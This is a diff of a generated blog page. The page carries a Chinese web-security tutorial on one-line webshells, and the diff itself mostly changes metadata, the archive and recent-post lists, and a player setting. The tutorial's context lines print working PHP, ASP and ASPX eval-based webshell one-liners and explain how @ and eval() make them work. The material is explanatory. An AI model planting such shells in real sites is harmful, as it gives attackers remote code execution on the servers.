@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200612192234704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200612192454904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-06-12T11:40:06.000Z">
-<meta property="article:modified_time" content="2020-06-12T11:56:00.409Z">
+<meta property="article:modified_time" content="2020-06-17T14:29:19.226Z">
 <meta property="article:author" content="Lzy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200612184915972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70">
@@ -110,7 +110,7 @@
 </blockquote>
 <h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>　　顾名思义，一句话木马的代码极短，通常只有一句话。但这并不意味着它无关紧要，相反，它由于短小精悍，功能强大，隐蔽性非常好，在渗透入侵中始终扮演着强大的作用。常见的一句话木马有以下几种形式：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马：</span><br><span class="line">	<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp的一句话木马：</span><br><span class="line">	&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">aspx的一句话木马：</span><br><span class="line">	&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;    &lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>])%&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h2><p>　　我们以最简单普遍的一句话木马 <strong><?php @eval($_POST['pass']);?></strong> 为例，来分析其组成。<br>　　首先是 @ 符号，它在 PHP 中是一个错误控制运算符，当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都会被忽略掉。例如：</p>
+<h2 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h2><p>　　我们以最简单普遍的一句话木马 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code> 为例，来分析其组成。<br>　　首先是 @ 符号，它在 PHP 中是一个错误控制运算符，当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都会被忽略掉。例如：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果去掉了@符号，而又没有通过POST方法接收到pass变量</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">服务器就会报一个提醒，类似于：Notice: Undefined index: pass in ......</span><br><span class="line">原因在于我们使用了一个未定义的变量pass</span><br></pre></td></tr></table></figure>
 <p>　　其次就是 eval() 函数，在 PHP 中 eval() 函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且必须以分号结尾。例如：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例一：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">该语句等效于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">示例二：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pwd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">然后利用POST方法接受pwd变量，例如pwd=<span class="keyword">echo</span> <span class="string">'a'</span>;</span><br><span class="line">以上语句就等效为<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">即等效为<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -129,7 +129,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" data-id="ckbjg9vc00001msus5mku2wt5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" data-id="ckch8thkj00048wusa9j86vrv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -174,7 +174,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li></ul>
     </div>
   </div>
 
@@ -185,6 +185,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/">XCTF系列 // Web ez题 Writeup</a>
+          </li>
         
           <li>
             <a href="/2020/06/17/Web%E5%AE%89%E5%85%A8-CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/">Web安全 // CSRF(跨站请求伪造)</a>
@@ -231,6 +235,7 @@
 	preload="auto"
 	list-folded="ture"
 	lrc-type="0"
+  volume=0.3
 	list-max-height="400px">
 </meting-js>
 </div>
